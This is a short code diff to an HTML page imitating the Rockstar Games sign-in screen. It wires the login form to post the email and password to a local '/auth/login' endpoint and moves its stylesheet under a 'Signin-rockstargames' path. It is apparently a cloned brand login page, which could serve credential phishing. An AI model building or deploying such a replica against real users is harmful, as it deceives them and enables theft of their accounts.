@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>Sign In - Rockstar Games</title>
     <link rel="shortcut icon" href="icons/rockstar.ico" type="image/x-icon">
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="/Signin-rockstargames/style.css">
 </head>
 <body>
 <div class="page">
@@ -20,7 +20,7 @@
                     <h1>Sign in</h1>
                     <div>
                         <div>
-                            <form class="login__form">
+                            <form class="login__form" action="/auth/login" method="post">
                                 <fieldset class="form__fieldset-email">
                                     <span class="fieldset__input">
                                         <input class="text-input" id="text-input" autocomplete="on" name="email"
@@ -33,7 +33,7 @@
                                 <fieldset class="form__fieldset-password">
                                     <span class="fieldset-password__password-input-container">
                                         <span class="fieldset__input">
-                                            <input class="text-input" id="text-input-password" type="password" placeholder="">
+                                            <input class="text-input" id="text-input-password" type="password" name="password" placeholder="">
                                             <label for="text-input-password" class="text-input__label">
                                                 <span>Password</span>
                                             </label>
